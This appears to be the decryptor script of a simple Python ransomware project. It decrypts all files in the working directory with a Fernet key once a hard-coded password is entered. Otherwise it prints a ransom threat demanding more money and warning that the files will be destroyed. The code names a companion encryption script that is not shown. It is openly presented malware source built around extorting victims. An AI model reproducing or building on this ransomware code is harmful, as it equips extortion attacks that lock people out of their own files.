import os
from cryptography.fernet import Fernet
import time
files = []
for file in os.listdir():
    if file == "encrypt_file.py" or file == 'env' or file == "thekey.key" or file == "decrypt_file.py":
        continue
    files.append(file)



with open("thekey.key","rb") as key:
    secret_key = key.read()

secret_password = "Ge@140019"
passwd = input("Enter the secret password to decrypt your file\n")
if passwd == secret_password:
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
        print("your file {} has decrypt, enjoy your coffe!".format(file))
        time.sleep(2)
else:
    print("password is wrong, send me more money :) or your file will destroy! ")

